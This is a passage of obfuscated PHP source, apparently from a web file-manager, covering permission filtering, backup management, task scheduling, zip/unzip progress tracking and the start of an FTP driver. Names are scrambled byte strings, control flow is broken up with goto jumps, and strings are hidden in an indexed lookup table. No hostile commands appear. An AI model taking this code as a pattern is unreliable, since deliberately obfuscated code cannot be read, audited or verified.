$Eó›†ªÊ›É[33], $Eó›†ªÊ›É[1712]); return empty($CÖœÛ­˜êğ) ? 0 : max($CÖœÛ­˜êğ) + 1; } private function filterAuth(&$Cè…Óª»ï») { goto e°“ÅõÓõ; e°“ÅõÓõ: if (!$Cè…Óª»ï») { return; } $cå¬¨…£“ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Cƒœ°’îŠ = array(); goto fÊÛÒˆŸ; FƒªÃ—…”‚: foreach ($Cƒœ°’îŠ as $Cö÷¼ôŞàË) { if (isset($FñØ¶Ñ”Åñ[$Cö÷¼ôŞàË])) { $Cƒœ°’îŠ = array_merge($Cƒœ°’îŠ, $FñØ¶Ñ”Åñ[$Cö÷¼ôŞàË]); } } $Cƒœ°’îŠ[] = self::AUTH_SHOW; $Cè…Óª»ï» = array_sum(array_unique($Cƒœ°’îŠ)); goto eÖí½Âµ³; fÊÛÒˆŸ: foreach ($cå¬¨…£“ as $Cö÷¼ôŞàË) { if ($Cè…Óª»ï» & $Cö÷¼ôŞàË) { $Cƒœ°’îŠ[] = $Cö÷¼ôŞàË; } } if (in_array(self::AUTH_ROOT, $Cƒœ°’îŠ)) { $Cè…Óª»ï» = array_sum($cå¬¨…£“); return; } $FñØ¶Ñ”Åñ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto FƒªÃ—…”‚; eÖí½Âµ³: } public function sort($B¶ó‰èíë, $c¥÷¾ôÊ) { return parent::update($B¶ó‰èíë, $c¥÷¾ôÊ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x62\141\143\x6b\165\160\x4c\x69\163\164"; public $field = array("\x69\x6f", "\156\141\x6d\x65", "\x73\x74\141\x74\165\x73", "\143\157\x6e\x74\x65\156\164", "\162\x65\x73\165\154\164", "\x74\x69\155\145\x46\x72\157\x6d", "\x74\151\155\x65\x54\157"); public function config() { goto f„ÄÀˆÙÜ; a¦Øê¢§¿: $Aƒ­±ƒù¾¤ = is_array($Aƒ­±ƒù¾¤) ? $Aƒ­±ƒù¾¤ : array(); if (!isset($Aƒ­±ƒù¾¤[$Dè¾Óê–µä[717]])) { $Aƒ­±ƒù¾¤[$Dè¾Óê–µä[717]] = $Dè¾Óê–µä[87]; } $b•–Èêø = array(); goto c»È¾åèì÷; D…‰’ğç”Ï: if (isset($b•–Èêø[$Dè¾Óê–µä[196]])) { $b•–Èêø[$Dè¾Óê–µä[196]] = json_decode($b•–Èêø[$Dè¾Óê–µä[196]], !0); } if (isset($Aƒ­±ƒù¾¤[$Dè¾Óê–µä[196]])) { $b•–Èêø[$Dè¾Óê–µä[196]][$Dè¾Óê–µä[1500]] = $Aƒ­±ƒù¾¤[$Dè¾Óê–µä[196]]; unset($Aƒ­±ƒù¾¤[$Dè¾Óê–µä[196]]); } return array_merge($b•–Èêø, $Aƒ­±ƒù¾¤); goto Dó…Œ›±”; f„ÄÀˆÙÜ: $Dè¾Óê–µä =& $_SERVER[Ç³Íß¦Ó]; $Aƒ­±ƒù¾¤ = Model($Dè¾Óê–µä[731])->get($Dè¾Óê–µä[743]); $Aƒ­±ƒù¾¤ = json_decode($Aƒ­±ƒù¾¤, !0); goto a¦Øê¢§¿; c»È¾åèì÷: Action($Dè¾Óê–µä[1713])->taskInit(); $b©Ë¨›íÌò = Model($Dè¾Óê–µä[1714])->listData(); foreach ($b©Ë¨›íÌò as $AĞ¥ÄÕŞ„£) { if ($AĞ¥ÄÕŞ„£[$Dè¾Óê–µä[1169]] == $Dè¾Óê–µä[87] && $AĞ¥ÄÕŞ„£[$Dè¾Óê–µä[1515]] == $Dè¾Óê–µä[1715]) { $b•–Èêø = $AĞ¥ÄÕŞ„£; break; } } goto D…‰’ğç”Ï; Dó…Œ›±”: } public function listData($A·ÅÈ×ŠßÎ = false, $a¸¾¯¡ÉÈ = "\155\x6f\x64\151\x66\171\124\x69\x6d\x65", $eÇ‚ì†¿Ëˆ = false) { return parent::listData($A·ÅÈ×ŠßÎ, $a¸¾¯¡ÉÈ, !0); } public function lastItem() { $d‘Úùâñğ = $this->listData(); return !empty($d‘Úùâñğ[0]) ? $d‘Úùâñğ[0] : null; } public function kill($dìèàğ•³±) { goto f–…İõÍ¢; cô öÅÏÉ¶: $aâ…ÈÎ•ï¥ = $fÖİõÓ¾²Í[$d¸ÄÉ¿å‡Ğ[28]]; $bã‘ÄÕ“ğ = TEMP_FILES . $d¸ÄÉ¿å‡Ğ[739] . $aâ…ÈÎ•ï¥ . $d¸ÄÉ¿å‡Ğ[8]; IO::remove($bã‘ÄÕ“ğ, !1); goto aÉ¸–·ìæñ; aÉ¸–·ìæñ: return $this->remove($dìèàğ•³±); goto aõõï‘•â¶; f–…İõÍ¢: $d¸ÄÉ¿å‡Ğ =& $_SERVER[Ç³Íß¦Ó]; $fÖİõÓ¾²Í = $this->listData($dìèàğ•³±); if (!$fÖİõÓ¾²Í || empty($fÖİõÓ¾²Í[$d¸ÄÉ¿å‡Ğ[28]])) { return !0; } goto D†ˆ¨á«Ü; D†ˆ¨á«Ü: Task::kill($d¸ÄÉ¿å‡Ğ[742]); Task::kill($d¸ÄÉ¿å‡Ğ[765]); Task::kill($d¸ÄÉ¿å‡Ğ[775]); goto cô öÅÏÉ¶; aõõï‘•â¶: } public function remove($eÊ¹›“º³) { $EÜ•Æ¹Úë· = $this->listData($eÊ¹›“º³); if (!$EÜ•Æ¹Úë·) { return !0; } return $this->backupRemove($EÜ•Æ¹Úë·); } private function backupRemove($dè¬®†ÕÚ·) { parent::remove($dè¬®†ÕÚ·[$_SERVER[Ç³Íß¦Ó][392]]); $dòĞ¿‘ä = $this->backupPath($dè¬®†ÕÚ·); IO::remove($dòĞ¿‘ä, !1); return !0; } private function backupPath($C“¦ÊÊ¦®”) { $F‘øèÀæ‹ =& $_SERVER[Ç³Íß¦Ó]; $d²Ñ¬³´«Š = $C“¦ÊÊ¦®”[$F‘øèÀæ‹[28]]; $fãËİöªßà = Model($F‘øèÀæ‹[731])->get($F‘øèÀæ‹[732]); $EåñÁ„‚­´ = substr(md5($F‘øèÀæ‹[733] . $fãËİöªßà . $d²Ñ¬³´«Š), 0, 8); return "\x7b\x69\x6f\x3a{$C“¦ÊÊ¦®”[$F‘øèÀæ‹[716]]}\x7d\57\144\141\164\141\142\x61\163\145\57\x62\141\143\x6b\x75\160\x2f" . $d²Ñ¬³´«Š . $F‘øèÀæ‹[71] . $EåñÁ„‚­´; } public function start() { goto d¾÷ßĞëãë; d¾÷ßĞëãë: $b»¼„‚Ù÷ =& $_SERVER[Ç³Íß¦Ó]; if ($GLOBALS[$b»¼„‚Ù÷[6]][$b»¼„‚Ù÷[88]][$b»¼„‚Ù÷[1716]] != $b»¼„‚Ù÷[87]) { return !0; } $C«§¿İƒÚ• = $this->config(); goto AèÏÒ–Ì†; E÷¸Åºâ“: $A¦Òºµ°¨ = new Backup(); $A¦Òºµ°¨->keep(); $FÛ©ÜøÙô¹ = $A¦Òºµ°¨->db(); goto B¥¢¹¾ñÌ‚; B¥¢¹¾ñÌ‚: if ($FÛ©ÜøÙô¹) { $FÛ©ÜøÙô¹ = $A¦Òºµ°¨->dbFile(); if ($FÛ©ÜøÙô¹ && $C«§¿İƒÚ•[$b»¼„‚Ù÷[717]] == $b»¼„‚Ù÷[495]) { $FÛ©ÜøÙô¹ = $A¦Òºµ°¨->file(); } } Backup::set(array($b»¼„‚Ù÷[714] => 1, $b»¼„‚Ù÷[474] => time())); return !0; goto A´áé«ÎØŸ; AèÏÒ–Ì†: if (!$C«§¿İƒÚ• || $C«§¿İƒÚ•[$b»¼„‚Ù÷[1497]] != $b»¼„‚Ù÷[87]) { return !1; } $dš£Æé‚š = $this->process(); foreach ($dš£Æé‚š as $FÛÄ‘â²Ï¨) { if ($FÛÄ‘â²Ï¨) { return Task::restart($FÛÄ‘â²Ï¨[$b»¼„‚Ù÷[392]]); } } goto E÷¸Åºâ“; A´áé«ÎØŸ: } public function process() { $C Ã”öÇ„ =& $_SERVER[Ç³Íß¦Ó]; return array($C Ã”öÇ„[719] => Task::get($C Ã”öÇ„[742]), $C Ã”öÇ„[723] => Task::get($C Ã”öÇ„[765]), $C Ã”öÇ„[192] => Task::get($C Ã”öÇ„[775])); } public function restore() { $C§ŞÇƒÍ³å =& $_SERVER[Ç³Íß¦Ó]; ActionCall($C§ŞÇƒÍ³å[1018], !0, 1); ActionCall($C§ŞÇƒÍ³å[1018], !0, 0); } } goto C“§†åƒÚƒ; E²ªÈ‡™Ä£: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($dÓ¤Á°¼ È, $bøİ¤ó¾Î = 5.0) { if (!$dÓ¤Á°¼ È) { return; } $BÍæ«½£ºÙ = Cache::get($dÓ¤Á°¼ È); if (!$BÍæ«½£ºÙ || timeFloat() - floatVal($BÍæ«½£ºÙ) >= $bøİ¤ó¾Î) { Cache::set($dÓ¤Á°¼ È, timeFloat(), $bøİ¤ó¾Î * 10); return !0; } return !1; } public static function timeLimitCall($DŠ¡Í±°æ¸, $a…¯¼‘Êõ¬, $DâÉŞ©‚é, $d£Û±¿¿œÉ = 5.0) { goto c• ’Âƒ›¶; cæòÃé©¤¶: Cache::set($eÉ¸ø…Ü¶•, $aÙ¢µƒ¤°Ñ, 60); Cache::removeMemory($eÉ¸ø…Ü¶•); write_log($DóïŒäƒ¥å[1603] . $DŠ¡Í±°æ¸ . $DóïŒäƒ¥å[68] . $a…¯¼‘Êõ¬, $DóïŒäƒ¥å[1597]); goto fßÒ£øñÎ; eô­¢Àè›²: if (is_array($aÙ¢µƒ¤°Ñ[$DŠ¡Í±°æ¸])) { $Fµ¿˜¡±á’[$DóïŒäƒ¥å[1602]] = $aÙ¢µƒ¤°Ñ[$DŠ¡Í±°æ¸][$DóïŒäƒ¥å[1602]]; } if (is_array($aÙ¢µƒ¤°Ñ[$DŠ¡Í±°æ¸])) { if (timeFloat() - $aÙ¢µƒ¤°Ñ[$DŠ¡Í±°æ¸][$DóïŒäƒ¥å[1601]] < $Fµ¿˜¡±á’[$DóïŒäƒ¥å[196]] * 0.3) { return; } $Fµ¿˜¡±á’[$DóïŒäƒ¥å[1602]] = $aÙ¢µƒ¤°Ñ[$DŠ¡Í±°æ¸][$DóïŒäƒ¥å[1602]]; } $aÙ¢µƒ¤°Ñ[$DŠ¡Í±°æ¸] = $Fµ¿˜¡±á’; goto cæòÃé©¤¶; c• ’Âƒ›¶: $DóïŒäƒ¥å =& $_SERVER[Ç³Íß¦Ó]; if (!$DŠ¡Í±°æ¸ || !$a…¯¼‘Êõ¬) { return; } self::$asyncAdd = !0; goto F–—­®¾÷; F–—­®¾÷: $eÉ¸ø…Ü¶• = $DóïŒäƒ¥å[1600]; $aÙ¢µƒ¤°Ñ = Cache::get($eÉ¸ø…Ü¶•, !0); $Fµ¿˜¡±á’ = array($DóïŒäƒ¥å[1601] => timeFloat(), $DóïŒäƒ¥å[1602] => timeFloat(), $DóïŒäƒ¥å[261] => $a…¯¼‘Êõ¬, $DóïŒäƒ¥å[1595] => $DâÉŞ©‚é, $DóïŒäƒ¥å[196] => $d£Û±¿¿œÉ); goto eô­¢Àè›²; fßÒ£øñÎ: } public static function timeLimitCallLoop() { goto fÁªÙØĞ–; A™÷îŞë–ô: if (!$f‰¼ªœ†°Ê && !self::$asyncAdd) { return; } $f×—Š‰×ŒŠ = $c·Ó‚íõ½™[1600]; $eÉŒ¬Ú…š = Cache::get($f×—Š‰×ŒŠ, !0); goto DÖ§·•—ÇÁ; DÖ§·•—ÇÁ: if (!$eÉŒ¬Ú…š || count($eÉŒ¬Ú…š) <= 0) { return; } $eŠÆªÃ‹ = !1; $D¯¯ ¤ÈÊ˜ = timeFloat(); goto EÛ®³ÂÙ‚Ÿ; fÁªÙØĞ–: $c·Ó‚íõ½™ =& $_SERVER[Ç³Íß¦Ó]; $aæ–‰ŠôÑ = array($c·Ó‚íõ½™[1604]); $f‰¼ªœ†°Ê = in_array(strtolower(ACTION), $aæ–‰ŠôÑ); goto A™÷îŞë–ô; eÙ²Íâë“É: if (!$b„œ´ÇÍ‡É) { return Cache::remove($f×—Š‰×ŒŠ); } Cache::set($f×—Š‰×ŒŠ, $b„œ´ÇÍ‡É, 60); Cache::removeMemory($f×—Š‰×ŒŠ); goto böñÆˆ¨”ó; EÛ®³ÂÙ‚Ÿ: $b„œ´ÇÍ‡É = array(); foreach ($eÉŒ¬Ú…š as $c‹óŒÄˆÒ => $aË®…Œ¸‘Ù) { if ($D¯¯ ¤ÈÊ˜ - $aË®…Œ¸‘Ù[$c·Ó‚íõ½™[1602]] > $aË®…Œ¸‘Ù[$c·Ó‚íõ½™[196]]) { $eŠÆªÃ‹ = !0; try { Hook::apply($aË®…Œ¸‘Ù[$c·Ó‚íõ½™[261]], $aË®…Œ¸‘Ù[$c·Ó‚íõ½™[1595]]); write_log($c·Ó‚íõ½™[1605] . $c‹óŒÄˆÒ . $c·Ó‚íõ½™[68] . $aË®…Œ¸‘Ù[$c·Ó‚íõ½™[261]] . $c·Ó‚íõ½™[1606] . ACTION, $c·Ó‚íõ½™[1597]); } catch (Exception $BïİÔç®›Ë) { } continue; } $b„œ´ÇÍ‡É[$c‹óŒÄˆÒ] = $aË®…Œ¸‘Ù; } if (!$eŠÆªÃ‹) { return; } goto eÙ²Íâë“É; böñÆˆ¨”ó: } public static function finished($b•™ÈÀ­†á, $EíÍÄµÔÉ’) { $Aª†óÓŠöÏ =& $_SERVER[Ç³Íß¦Ó]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Aª†óÓŠöÏ[261] => $b•™ÈÀ­†á, $Aª†óÓŠöÏ[1595] => $EíÍÄµÔÉ’); } private static function finishedRun() { $a„ñğÅ‘¿— =& $_SERVER[Ç³Íß¦Ó]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $d…å¬£˜œ¯) { try { Hook::apply($d…å¬£˜œ¯[$a„ñğÅ‘¿—[261]], $d…å¬£˜œ¯[$a„ñğÅ‘¿—[1595]]); } catch (Exception $føçÏ¾¿ƒÖ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto b“ßëÉÖæ¡; D‹öò×öôö: Hook::bind($FòÍª‚¬õ»[1089], array($this, $FòÍª‚¬õ»[1609])); $C²ö†ï’Ÿ› =& $this->task; $C²ö†ï’Ÿ›[$FòÍª‚¬õ»[1610]] = $FòÍª‚¬õ»[1094]; goto cÃ÷›âìŞñ; cÃ÷›âìŞñ: if (!$C²ö†ï’Ÿ›[$FòÍª‚¬õ»[1432]]) { $C²ö†ï’Ÿ›[$FòÍª‚¬õ»[1432]] = LNG($FòÍª‚¬õ»[1611]); } goto eà¸ëÎ…Ø; b“ßëÉÖæ¡: $FòÍª‚¬õ» =& $_SERVER[Ç³Íß¦Ó]; parent::startAfter(); Hook::bind($FòÍª‚¬õ»[1607], array($this, $FòÍª‚¬õ»[1608])); goto D‹öò×öôö; eà¸ëÎ…Ø: } protected function endAfter() { $E¨®”éïÇœ =& $_SERVER[Ç³Íß¦Ó]; parent::endAfter(); Hook::unbind($E¨®”éïÇœ[1607], array($this, $E¨®”éïÇœ[1608])); Hook::unbind($E¨®”éïÇœ[1089], array($this, $E¨®”éïÇœ[1609])); } public function updateAfter() { $dÅóßÑ¹š =& $_SERVER[Ç³Íß¦Ó]; $fÛğéÅÊø¿ =& $this->task; if (!$fÛğéÅÊø¿[$dÅóßÑ¹š[1021]] || !$fÛğéÅÊø¿[$dÅóßÑ¹š[724]]) { return; } if ($fÛğéÅÊø¿[$dÅóßÑ¹š[1610]] == $dÅóßÑ¹š[1094]) { $Câòáù = 0; if ($fÛğéÅÊø¿[$dÅóßÑ¹š[1569]]) { $Câòáù = $fÛğéÅÊø¿[$dÅóßÑ¹š[1570]] / $fÛğéÅÊø¿[$dÅóßÑ¹š[1569]]; } $fÛğéÅÊø¿[$dÅóßÑ¹š[1527]] = $Câòáù * 0.3; } else { if ($fÛğéÅÊø¿[$dÅóßÑ¹š[1610]] == $dÅóßÑ¹š[310]) { $Câòáù = $fÛğéÅÊø¿[$dÅóßÑ¹š[1036]] / $fÛğéÅÊø¿[$dÅóßÑ¹š[1021]]; $fÛğéÅÊø¿[$dÅóßÑ¹š[1527]] = 0.3 + $Câòáù * 0.4; } else { if ($fÛğéÅÊø¿[$dÅóßÑ¹š[1610]] == $dÅóßÑ¹š[107]) { $bŠË§Ú¥Ñ = 0; if ($fÛğéÅÊø¿[$dÅóßÑ¹š[1571]] == $dÅóßÑ¹š[107]) { $bŠË§Ú¥Ñ = $fÛğéÅÊø¿[$dÅóßÑ¹š[1570]]; } $Câòáù = ($fÛğéÅÊø¿[$dÅóßÑ¹š[1574]] + $bŠË§Ú¥Ñ) / $fÛğéÅÊø¿[$dÅóßÑ¹š[724]]; $fÛğéÅÊø¿[$dÅóßÑ¹š[1527]] = 0.3 + 0.4 + $Câòáù * 0.3; } } } if ($fÛğéÅÊø¿[$dÅóßÑ¹š[1527]] > 0) { $cØŒ×Àå”Á = timeFloat() - $fÛğéÅÊø¿[$dÅóßÑ¹š[750]] - $fÛğéÅÊø¿[$dÅóßÑ¹š[1530]]; $fÛğéÅÊø¿[$dÅóßÑ¹š[1531]] = $cØŒ×Àå”Á * (1 - $fÛğéÅÊø¿[$dÅóßÑ¹š[1527]]) / $fÛğéÅÊø¿[$dÅóßÑ¹š[1527]]; } } public function addFile($F£¥íñŞ…„) { goto Fô‘ÍÇ‹‰; fÙ¼¿ß‘šŠ: $C™ğÎò†ó‡[$cÆÇ¾‘×§[1567]] = $d‰ã×ÒÄà»[$cÆÇ¾‘×§[28]]; $C™ğÎò†ó‡[$cÆÇ¾‘×§[1569]] = $d‰ã×ÒÄà»[$cÆÇ¾‘×§[78]]; $C™ğÎò†ó‡[$cÆÇ¾‘×§[1570]] = 0; goto Aö¯‰”Ùƒµ; cˆÉ·ƒ¤: $this->update(); goto F¡×ğ–±‚; Aö¯‰”Ùƒµ: $C™ğÎò†ó‡[$cÆÇ¾‘×§[1023]] = $cÆÇ¾‘×§[1586]; $C™ğÎò†ó‡[$cÆÇ¾‘×§[1571]] = $cÆÇ¾‘×§[1094]; $C™ğÎò†ó‡[$cÆÇ¾‘×§[724]] = $d‰ã×ÒÄà»[$cÆÇ¾‘×§[78]]; goto a”—Ô½œ˜; a”—Ô½œ˜: $C™ğÎò†ó‡[$cÆÇ¾‘×§[1021]] = 1; $F¾Æ®Â‰ÁÓ = 0; $C™ğÎò†ó‡[$cÆÇ¾‘×§[1578]] = array($cÆÇ¾‘×§[1579] => $F¾Æ®Â‰ÁÓ + 1, $cÆÇ¾‘×§[411] => $d‰ã×ÒÄà»[$cÆÇ¾‘×§[28]], $cÆÇ¾‘×§[76] => $d‰ã×ÒÄà»[$cÆÇ¾‘×§[76]], $cÆÇ¾‘×§[493] => $d‰ã×ÒÄà»[$cÆÇ¾‘×§[493]] ? $d‰ã×ÒÄà»[$cÆÇ¾‘×§[493]] : $d‰ã×ÒÄà»[$cÆÇ¾‘×§[76]]); goto cˆÉ·ƒ¤; Fô‘ÍÇ‹‰: $cÆÇ¾‘×§ =& $_SERVER[Ç³Íß¦Ó]; $C™ğÎò†ó‡ =& $this->task; $d‰ã×ÒÄà» = IO::info($F£¥íñŞ…„); goto fÙ¼¿ß‘šŠ; F¡×ğ–±‚: } public function unzipAfter($cßßÃ„¦·) { goto f¯Ú‘„ê‹¥; f¯Ú‘„ê‹¥: $dî§ï½ß±‹ =& $_SERVER[Ç³Íß¦Ó]; $fæ‰‚ÉÆÜÆ =& $this->task; $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1610]] = $dî§ï½ß±‹[107]; goto déš—‡Ç¤£; Bó¼ê¢Ìˆ©: $this->update(); self::log($dî§ï½ß±‹[1612] . json_encode(array($fæ‰‚ÉÆÜÆ, $D…À­ÙªèÍ))); goto bù¨¿ÁÁĞè; eáç’ëÉŒÌ: if ($D…À­ÙªèÍ[$dî§ï½ß±‹[29]] == $dî§ï½ß±‹[192]) { $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1021]] = 1; } else { $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1021]] = $D…À­ÙªèÍ[$dî§ï½ß±‹[81]][$dî§ï½ß±‹[79]]; } $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1023]] = $dî§ï½ß±‹[33]; $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1571]] = 0; goto B¼µŸ„†¸ß; a»Ö”§­É: $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1567]] = $dî§ï½ß±‹[33]; $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1574]] = 0; $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[724]] = $D…À­ÙªèÍ[$dî§ï½ß±‹[78]]; goto Bó¼ê¢Ìˆ©; B¼µŸ„†¸ß: $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1036]] = 0; $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1569]] = 0; $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1570]] = 0; goto a»Ö”§­É; déš—‡Ç¤£: $D…À­ÙªèÍ = IO::infoWithChildren($cßßÃ„¦·); $CÆõêÕ‹ù‹ = 0; $fæ‰‚ÉÆÜÆ[$dî§ï½ß±‹[1578]] = array($dî§ï½ß±‹[1579] => $CÆõêÕ‹ù‹ + 1, $dî§ï½ß±‹[411] => $D…À­ÙªèÍ[$dî§ï½ß±‹[28]], $dî§ï½ß±‹[76] => $D…À­ÙªèÍ[$dî§ï½ß±‹[76]], $dî§ï½ß±‹[493] => $D…À­ÙªèÍ[$dî§ï½ß±‹[493]] ? $D…À­ÙªèÍ[$dî§ï½ß±‹[493]] : $D…À­ÙªèÍ[$dî§ï½ß±‹[76]]); goto eáç’ëÉŒÌ; bù¨¿ÁÁĞè: } public function nameParse($Bô’ïˆäè) { goto cóÄ‹‰†ñ; cóÄ‹‰†ñ: $DŒØ…²ÌéÔ =& $_SERVER[Ç³Íß¦Ó]; $Eì¦¡äÌĞø =& $this->task; if ($Eì¦¡äÌĞø[$DŒØ…²ÌéÔ[1610]] == $DŒØ…²ÌéÔ[1094]) { $Eì¦¡äÌĞø[$DŒØ…²ÌéÔ[1610]] = $DŒØ…²ÌéÔ[310]; $Eì¦¡äÌĞø[$DŒØ…²ÌéÔ[1574]] = 0; $Eì¦¡äÌĞø[$DŒØ…²ÌéÔ[724]] = 0; } goto d´ÔàÍô —; AÒŸ¹öÁ…É: $this->update(); goto C¼õ…½Ã; d´ÔàÍô —: $c¼½‰åŸºš = get_path_this($Bô’ïˆäè); if (strstr($c¼½‰åŸºš, $DŒØ…²ÌéÔ[95])) { $Eì¦¡äÌĞø[$DŒØ…²ÌéÔ[1036]] += 1; $Eì¦¡äÌĞø[$DŒØ…²ÌéÔ[1021]] += 1; } $Eì¦¡äÌĞø[$DŒØ…²ÌéÔ[1567]] = $Bô’ïˆäè; goto AÒŸ¹öÁ…É; C¼õ…½Ã: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $FŒŸ³¨¶³ù =& $_SERVER[Ç³Íß¦Ó]; parent::startAfter(); Hook::bind($FŒŸ³¨¶³ù[1613], array($this, $FŒŸ³¨¶³ù[1608])); $D†¨´³´ƒ =& $this->task; $D†¨´³´ƒ[$FŒŸ³¨¶³ù[1610]] = $FŒŸ³¨¶³ù[1094]; if (!$D†¨´³´ƒ[$FŒŸ³¨¶³ù[1432]]) { $D†¨´³´ƒ[$FŒŸ³¨¶³ù[1432]] = LNG($FŒŸ³¨¶³ù[1614]); } } protected function endAfter() { $a¡•ÚÙ‡­Á =& $_SERVER[Ç³Íß¦Ó]; parent::endAfter(); Hook::unbind($a¡•ÚÙ‡­Á[1613], array($this, $a¡•ÚÙ‡­Á[1608])); } public function updateAfter() { $Bˆèå»¡ =& $_SERVER[Ç³Íß¦Ó]; $DÃÈ¼”ëƒÌ =& $this->task; if (!$DÃÈ¼”ëƒÌ[$Bˆèå»¡[1021]] || !$DÃÈ¼”ëƒÌ[$Bˆèå»¡[724]]) { return; } if ($DÃÈ¼”ëƒÌ[$Bˆèå»¡[1610]] == $Bˆèå»¡[1094]) { $a®™È²Öß¤ = $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1570]]; if ($DÃÈ¼”ëƒÌ[$Bˆèå»¡[1571]] != $Bˆèå»¡[1094]) { $a®™È²Öß¤ = 0; } $E¿â°ğÎá· = ($DÃÈ¼”ëƒÌ[$Bˆèå»¡[1574]] + $a®™È²Öß¤) / $DÃÈ¼”ëƒÌ[$Bˆèå»¡[724]]; $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1527]] = $E¿â°ğÎá· * 0.3; } else { if ($DÃÈ¼”ëƒÌ[$Bˆèå»¡[1610]] == $Bˆèå»¡[310]) { $E¿â°ğÎá· = $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1036]] / $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1021]]; $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1527]] = 0.3 + $E¿â°ğÎá· * 0.5; } else { if ($DÃÈ¼”ëƒÌ[$Bˆèå»¡[1610]] == $Bˆèå»¡[107]) { $E¿â°ğÎá· = 0; if ($DÃÈ¼”ëƒÌ[$Bˆèå»¡[1569]]) { $E¿â°ğÎá· = $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1570]] / $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1569]]; } $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1527]] = 0.3 + 0.5 + $E¿â°ğÎá· * 0.2; } } } if ($DÃÈ¼”ëƒÌ[$Bˆèå»¡[1527]] > 0) { $d®£·Ø¼µã = timeFloat() - $DÃÈ¼”ëƒÌ[$Bˆèå»¡[750]] - $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1530]]; $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1531]] = $d®£·Ø¼µã * (1 - $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1527]]) / $DÃÈ¼”ëƒÌ[$Bˆèå»¡[1527]]; } } public function copyFileStart($cÊ¹ÃÆç, $aöÅñø‚—½, $F‰Õòˆõ¼, $Eµºï°Û½, $fŠ¼»¡¬«ñ, $fµ™¥æòÕÓ) { $bˆïÒÔÌó =& $_SERVER[Ç³Íß¦Ó]; parent::copyFileStart($cÊ¹ÃÆç, $aöÅñø‚—½, $F‰Õòˆõ¼, $Eµºï°Û½, $fŠ¼»¡¬«ñ, $fµ™¥æòÕÓ); $FÕÛ¼‰Şƒ =& $this->task; if ($FÕÛ¼‰Şƒ[$bˆïÒÔÌó[1610]] == $bˆïÒÔÌó[310]) { $FÕÛ¼‰Şƒ[$bˆïÒÔÌó[1610]] = $bˆïÒÔÌó[107]; } $this->update(); } public function copyFileEnd($fÑÇî…†£Ø, $D¿ÄïÁÚÈß, $e¾Ë¦³ä¼, $cÑ„â‹«, $E«Å‰™Ğˆ», $Fí±™š¯ÎÎ) { $bÁó…Á „¶ =& $_SERVER[Ç³Íß¦Ó]; $fÍ„‹³·¨‡ =& $this->task; $fÍ„‹³·¨‡[$bÁó…Á „¶[1570]] = $fÍ„‹³·¨‡[$bÁó…Á „¶[1569]]; $fÍ„‹³·¨‡[$bÁó…Á „¶[1574]] += $fÍ„‹³·¨‡[$bÁó…Á „¶[1569]]; $fÍ„‹³·¨‡[$bÁó…Á „¶[1571]] = $bÁó…Á „¶[33]; $this->update(); } public function nameParse($CÅßâÜ©Æó) { $F©ƒë¯Ââñ =& $_SERVER[Ç³Íß¦Ó]; $EÆè™‚ÊƒÒ =& $this->task; if ($EÆè™‚ÊƒÒ[$F©ƒë¯Ââñ[1036]] < $EÆè™‚ÊƒÒ[$F©ƒë¯Ââñ[1021]]) { $C‰½‹òÍÓù = get_path_this($CÅßâÜ©Æó); if (strstr($C‰½‹òÍÓù, $F©ƒë¯Ââñ[95])) { $EÆè™‚ÊƒÒ[$F©ƒë¯Ââñ[1036]] += 1; } } if ($EÆè™‚ÊƒÒ[$F©ƒë¯Ââñ[1610]] == $F©ƒë¯Ââñ[1094]) { $EÆè™‚ÊƒÒ[$F©ƒë¯Ââñ[1610]] = $F©ƒë¯Ââñ[310]; } $EÆè™‚ÊƒÒ[$F©ƒë¯Ââñ[1567]] = $CÅßâÜ©Æó; $this->update(); } } goto a¼¡¥„¸æ¡; eßÚŠä¬×›: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($D¿À³Øğ§™) { parent::__construct(); if (count($D¿À³Øğ§™) > 0) { $this->_init($D¿À³Øğ§™); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($d¿Ï·±°ñ) { $a°Ñ³±œÀ =& $_SERVER[Ç³Íß¦Ó]; global $config; $this->appCharset = $config[$a°Ñ³±œÀ[1240]]; $this->systemCharset = $config[$a°Ñ³±œÀ[1241]]; if (isset($d¿Ï·±°ñ[$a°Ñ³±œÀ[1242]]) && 